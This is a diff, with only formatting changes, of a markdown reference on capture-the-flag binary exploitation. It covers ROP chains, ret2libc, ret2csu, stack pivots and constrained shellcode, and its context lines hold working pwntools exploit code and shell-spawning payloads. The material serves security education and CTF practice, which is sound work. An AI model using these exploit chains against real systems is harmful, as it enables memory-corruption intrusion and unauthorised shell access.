@@ -1,7 +1,6 @@
 # CTF Pwn - ROP Chains and Shellcode
 
 ## Table of Contents
-
 - [ROP Chain Building](#rop-chain-building)
   - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak--shell)
   - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
@@ -24,7 +23,7 @@
 
 For double stack pivot, SROP with UTF-8 constraints, RETF architecture switch, seccomp bypass, .fini_array hijack, ret2vdso, pwntools template, and shellcode with input reversal, see [rop-advanced.md](rop-advanced.md).
 
-------
+---
 
 ## ROP Chain Building
 
@@ -69,7 +68,6 @@ payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main
 ```
 
 **Leak parsing with no-newline printf:**
-
 ```python
 # If printf("Laundry complete") has no trailing newline,
 # puts() leak appears right after it on the same line:
@@ -107,7 +105,6 @@ payload += p64(libc_base + syscall_ret)
 ```
 
 **When to use raw syscall vs libc functions:**
-
 - `system()` through libc: simplest, but may crash due to stack alignment or CET
 - `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
 - Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
@@ -118,24 +115,20 @@ payload += p64(libc_base + syscall_ret)
 After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.
 
 **Solutions:**
-
 1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
-
 2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
-
    ```python
    # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
    # Set rbp first so rbp-0x40 points to target buffer:
    POP_RBP_RET = 0x40113d
    VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]
-   
+
    payload += p64(POP_RBP_RET)
    payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
    payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
    # WARNING: After read, code continues to printf + leave;ret
    # leave sets rsp=rbp, so you get a stack pivot to rbp!
    ```
-
 3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.
 
 ### Shell Interaction After execve
@@ -166,7 +159,6 @@ flag = p.recv(timeout=3)
 **When to use:** Need to control `rdx`, `rsi`, and `edi` for a function call but no direct `pop rdx` gadget exists in the binary. `__libc_csu_init` is present in nearly all dynamically linked ELF binaries and contains two useful gadget sequences.
 
 **Gadget 1 (pop chain):** At the end of `__libc_csu_init`:
-
 ```asm
 pop rbx        ; 0
 pop rbp        ; 1
@@ -178,7 +170,6 @@ ret
 ```
 
 **Gadget 2 (call + set registers):** Earlier in `__libc_csu_init`:
-
 ```asm
 mov rdx, r15   ; rdx = r15
 mov rsi, r14   ; rsi = r14
@@ -191,7 +182,6 @@ jne .loop      ; loop if rbx != rbp
 ```
 
 **Exploit pattern:**
-
 ```python
 csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
 csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL
@@ -215,7 +205,7 @@ payload = flat(
 
 **Key insight:** ret2csu provides universal gadgets for setting up to 3 arguments (`rdi`, `rsi`, `rdx`) and calling any function via its GOT entry, without needing libc gadgets. Useful when the binary is statically small but dynamically linked.
 
-------
+---
 
 ## Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)
 
@@ -224,7 +214,6 @@ payload = flat(
 **Strategy:** XOR each chunk of data with a known key, write the XOR'd value to `.data` section, then XOR it back in place using gadgets from the binary.
 
 **Required gadgets:**
-
 ```asm
 pop r14; pop r15; ret          ; load XOR key (r14) and target address (r15)
 xor [r15], r14; ret            ; XOR memory at r15 with r14
@@ -232,7 +221,6 @@ mov [r15], r14; ret            ; write r14 to memory at r15 (initial write)
 ```
 
 **Exploit pattern:**
-
 ```python
 data_section = elf.symbols['__data_start']  # or .data address
 xor_key = 2  # simple key that removes bad chars
@@ -270,7 +258,7 @@ payload += flat(pop_rdi, data_section, elf.plt['print_file'])
 
 **Key insight:** XOR is self-inverse (`a ^ k ^ k = a`). Choose a key that transforms all forbidden bytes into allowed ones. For simple cases, XOR with `2` or `0x41` works. For complex restrictions, solve per-byte: for each position, find any key byte where `original ^ key` avoids all bad characters.
 
-------
+---
 
 ## Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)
 
@@ -336,14 +324,13 @@ def find_mask(target_byte, source=0xb0bababa):
 
 **Key insight:** When a binary lacks standard write gadgets, exotic instructions (BEXTR, PEXT, XLAT, STOSB, BSWAP, XCHG) can be chained for the same effect. Check `questionableGadgets` or similar labeled sections in challenge binaries.
 
-------
+---
 
 ## Stack Pivot via xchg rax,esp (Crypto-Cat)
 
 **When to use:** Buffer is too small for the full ROP chain, but the program leaks a heap/stack address where a larger buffer has been prepared.
 
 **Two-stage pattern:**
-
 ```python
 # Stage 1: Program provides a heap address where it wrote user data
 pivot_addr = int(io.recvline(), 16)
@@ -369,14 +356,13 @@ payload = flat(
 ```
 
 **Why xchg vs. leave;ret:**
-
 - `leave; ret` sets `rsp = rbp` — requires controlling `rbp` (often possible via overflow)
 - `xchg rax, esp` swaps directly — requires controlling `rax` (via `pop rax; ret`)
 - `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)
 
 **Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.
 
-------
+---
 
 ## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)
 
@@ -410,7 +396,7 @@ rop += p32(bss_addr)
 
 **Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.
 
-------
+---
 
 ## DynELF Automated Libc Discovery (RC3 CTF 2016)
 
@@ -450,7 +436,7 @@ io.interactive()
 
 **Key insight:** DynELF parses the remote ELF's `.dynamic` section, link map, and symbol tables to resolve any libc function without knowing the libc version. Requires a reliable memory read primitive (leak function) that can read arbitrary addresses.
 
-------
+---
 
 ## Constrained Shellcode in Small Buffers (TUM CTF 2016)
 
@@ -474,12 +460,11 @@ syscall                   ; 2 bytes - execve("/bin/sh", argv, NULL)
 
 ; When AES-CBC is involved, craft IV to XOR-decrypt shellcode block:
 ; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
-
 ```
 
 **Key insight:** The `cdq` instruction (1 byte) zero-extends eax into edx, and `push reg; pop reg` pairs (2 bytes) replace `mov` (3 bytes). For AES-block-constrained shellcode, compute the IV that decrypts to your shellcode by XORing `AES_decrypt(ciphertext_block)` with the desired shellcode.
 
-------
+---
 
 ## Stack Canary XOR Epilogue as RDX Zeroing Gadget (VolgaCTF 2017)
 
@@ -506,7 +491,6 @@ rop = flat(
     canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
     execve_addr,                  # execve("/bin/sh", NULL, NULL)
 )
-
 ```
 
 **Key insight:** The stack canary check `xor rdx, fs:28h` produces `rdx=0` when the canary is correct. Jump into this epilogue as a gadget when `pop rdx` is unavailable -- it provides a reliable zero-rdx primitive with only a benign byte-write side effect. This works because the canary on the stack matches `fs:28h`, so the XOR result is always zero in a non-corrupted frame.
@@ -515,14 +499,13 @@ rop = flat(
 
 **References:** VolgaCTF 2017
 
-------
+---
 
 ## Minimal Shellcode with Pre-Initialized Registers (Square CTF 2017)
 
 **Pattern:** When the shellcode entry point has registers already initialized to useful values (e.g., `eax=4` for the `write` syscall on x86-32, `ebx=1` for stdout), exploit them to dramatically reduce shellcode size. Always audit register state at entry before writing shellcode from scratch.
 
 **Example (x86-32 write syscall, entry: eax=4, ebx=1):**
-
 ```asm
 ; Entry state: eax=4 (sys_write), ebx=1 (stdout fd)
 ; Goal: write flag buffer to stdout — only need ecx and edx
@@ -537,11 +520,9 @@ mov dl, 64                      ; 2 bytes
 int 0x80                        ; 2 bytes
 
 ; Total: 7 bytes — or as few as 5 if edx is already set
-
 ```
 
 **Workflow:**
-
 ```python
 # 1. Run the binary in gdb, break right before shellcode is executed
 # 2. Inspect all registers: info registers
@@ -553,21 +534,19 @@ int 0x80                        ; 2 bytes
 # - ebx = fd (stdin=0, stdout=1) from prior open/setup
 # - rdi, rsi from calling convention leakage
 # - rsp pointing into a writable region (for push-based addressing)
-
 ```
 
 **Key insight:** Always audit entry register values before writing shellcode — pre-loaded syscall numbers and fd values can reduce shellcode to under 6 bytes. The smallest possible shellcode exploits the ABI calling convention residue left by the surrounding code.
 
 **References:** Square CTF 2017
 
-------
+---
 
 ## Unique-Byte Shellcode via syscall RIP to RCX (HITCON 2017)
 
 **Pattern:** x86-64 `syscall` instruction saves `RIP` (next instruction address) into `RCX` as a side effect. An 8-byte stager exploits this: execute `syscall` (which also triggers a `read` with pre-set registers), then use `rcx` (now = address of the instruction after `syscall`) as the address for reading the full shellcode to the same RWX location. All 8 bytes of the stager must be unique (no repeated bytes).
 
 **8-byte stager construction:**
-
 ```asm
 ; Entry constraints: rax=0 (read), rdi=0 (stdin), rsi=shellcode_buf, rdx=8 (small)
 ; Side effect of syscall: rcx = RIP (address of next instruction after syscall)
@@ -580,11 +559,9 @@ xor edx, edx     ; 2 bytes: 31 d2 — clear rdx
 mov dl, 100      ; 2 bytes: b2 64 — rdx = 100 (read size for stage 2)
 ; Back to syscall (loop): the push/pop sequence ends up jumping to syscall again
 ; ... or arrange entry so the next syscall reads 100 bytes to rsi
-
 ```
 
 **Uniqueness constraint:**
-
 ```python
 # All 8 bytes must be distinct (challenge-specific filter)
 # Candidate sequence: 0f 05 51 5e 31 d2 b2 64  — all unique
@@ -596,21 +573,19 @@ assert len(set(stager)) == len(stager)  # passes
 from pwn import *
 p.send(stager)
 p.send(asm(shellcraft.sh()))
-
 ```
 
 **Key insight:** x86-64 `syscall` copies RIP to RCX — weaponize this as position-independent address discovery for tiny shellcode stagers. The stager needs no hardcoded addresses: it calculates its own location via the `syscall` side effect, then uses that address as the destination for reading the full payload.
 
 **References:** HITCON CTF 2017
 
-------
+---
 
 ## stub_execveat Syscall as execve Alternative (ASIS CTF 2018)
 
 **Pattern:** In a tiny binary with only `read` syscall and no `pop rax` gadget, use `stub_execveat` (syscall 0x142/322) instead of `execve` (0x3b). Since `read()` returns bytes-read in `rax`, make total input length exactly 0x142 bytes so `rax=0x142` when the syscall gadget fires.
 
 **Why this works:**
-
 1. The binary is tiny -- only `read` and basic gadgets, no `pop rax; ret`
 2. `execve` requires `rax=0x3b` (59), but without `pop rax` there's no way to set it
 3. `read()` returns the number of bytes read in `rax` -- this is the only rax control
@@ -636,14 +611,13 @@ payload += b"A" * (0x142 - len(payload) - 1)        # pad to exactly 0x142 bytes
 io = remote('target', 1337)
 io.send(payload)
 io.interactive()
-
 ```
 
 **Key insight:** `stub_execveat` (syscall 322/0x142) accepts the same arguments as execve when `AT_FDCWD` is used, but its higher syscall number can be reached via `read()` return value when `pop rax; ret` gadgets are unavailable. Always check if alternative syscalls with equivalent functionality have numbers reachable through return values or other implicit register control.
 
 **References:** ASIS CTF 2018
 
-------
+---
 
 ## Alphanumeric Shellcode Bootstrap via push/pop When rax=0 (nullcon HackIM 2019)
 
@@ -678,7 +652,6 @@ sc = asm(sc)
 # push r12 (0x41 0x54) + pop rax (0x58) = 3 bytes, all happen to be alnum-safe
 bootstrap = asm("push r12; pop rax;")
 payload = bootstrap + alphanum_encoder(sc, 3)
-
 ```
 
 **Key insight:** Alphanumeric-only decoders typically need `rax` to point at (or a fixed offset before) the payload. If the harness zeroes `rax`, seed it from *any* volatile register that already holds a valid address — `r12` is routinely `_start` on Linux, and `push r12; pop rax` happens to be `AT X` (0x41 0x54 0x58), which the encoder's input filter treats as benign. Adjust the encoder's `padding_len` argument to exactly match the prepended byte count so the decode math still lines up.
